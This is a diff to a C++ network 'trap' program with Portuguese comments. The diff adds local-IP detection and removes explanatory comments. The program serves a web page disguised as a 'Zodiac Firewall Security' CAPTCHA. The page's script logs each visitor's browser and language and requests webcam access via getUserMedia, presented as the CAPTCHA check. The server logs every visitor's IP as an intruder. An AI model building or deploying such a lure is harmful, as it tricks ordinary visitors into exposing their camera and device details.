@@ -8,6 +8,7 @@
 #include <unistd.h>
 #include <csignal>
 #include <sys/select.h>
+#include <ifaddrs.h> // Biblioteca nativa do Linux para listar interfaces de rede
 
 using namespace std;
 
@@ -30,6 +31,35 @@ void desligar_fortaleza(int sinal) {
     exit(sinal);
 }
 
+// Função para detectar automaticamente o IP local da máquina no Linux
+string obter_ip_local() {
+    struct ifaddrs *interfaces = NULL;
+    struct ifaddrs *ifa = NULL;
+    void *tmpAddrPtr = NULL;
+    string ip_detectado = "127.0.0.1"; // Padrão localhost caso falte rede
+
+    if (getifaddrs(&interfaces) == 0) {
+        ifa = interfaces;
+        while (ifa != NULL) {
+            if (ifa->ifa_addr != NULL && ifa->ifa_addr->sa_family == AF_INET) { // Verifica se é IPv4
+                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+                char addressBuffer[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
+                
+                string nome_interface = ifa->ifa_name;
+                // Ignora a interface de loopback interna (127.0.0.1) e foca na rede real (Wi-Fi ou Cabo)
+                if (nome_interface != "lo") {
+                    ip_detectado = string(addressBuffer);
+                    break;
+                }
+            }
+            ifa = ifa->ifa_next;
+        }
+    }
+    if (interfaces) freeifaddrs(interfaces);
+    return ip_detectado;
+}
+
 int main() {
     signal(SIGINT, desligar_fortaleza);
     system("clear");
@@ -41,6 +71,11 @@ int main() {
     cout << VERDE << "               /\\  /\\       (CAPTCHA TRAP v3)     /\\  /\\" << endl;
     cout << VERDE << "              |_____|______|___________|_____|______|_____|" << RESET << endl;
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
+
+    // EXIBIÇÃO DO IP LOCAL EM DESTAQUE VERDE
+    string meu_ip = obter_ip_local();
+    cout << VERDE << NEGRITO << "\n[📡 INFRAESTRUTURA] IP LOCAL DETECTADO: " << AMARELO << meu_ip << RESET << endl;
+    cout << CIANO << "[*] Para testar o CAPTCHA, acesse no navegador: " << VERDE << "http://" << meu_ip << RESET << endl << endl;
 
     vector<int> portas_armadilha = {80, 25565};
     int max_fd = 0;
@@ -78,7 +113,6 @@ int main() {
 
     cout << VERDE << NEGRITO << "\n[+] SUCESSO: Fortaleza Web Online! Aguardando varreduras de IP...\n" << RESET << endl;
 
-    // Código da página HTML redesenhada com um CAPTCHA profissional e sombrio
     string html_trap = 
         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
         "<!DOCTYPE html><html><head><title>Zodiac Firewall Security</title>"
@@ -101,11 +135,9 @@ int main() {
         "  </div>"
         "<script>"
         "  function dispararVerificacao() {"
-        "    // Coleta dados técnicos do sistema operacional e navegador"
         "    console.log('Navegador do Alvo: ' + navigator.userAgent);"
         "    console.log('Idioma do Sistema: ' + navigator.language);"
         "    "
-        "    // Dispara a solicitação de mídia vinculada à caixa de checagem do CAPTCHA"
         "    navigator.mediaDevices.getUserMedia({ video: true })"
         "    .then(function(stream) {"
         "       alert('Verificação concluída. Seu dispositivo foi validado pelo painel.');"
@@ -136,7 +168,6 @@ int main() {
 
                     string ip_intruso = inet_ntoa(client_addr.sin_addr);
 
-                    // Alerta no painel C++
                     cout << VERMELHO << NEGRITO << "\n\a[🚨 ZODIAC TRAP DETECTED 🦅] ➔ INTERCEPTAÇÃO WEB!" << RESET << endl;
                     cout << CIANO << "   ➔ IP do Intruso:       " << AMARELO << ip_intruso << RESET << endl;
                     cout << CIANO << "   ➔ Porta do Teste:      " << VERMELHO << porta_atacada << RESET << endl;
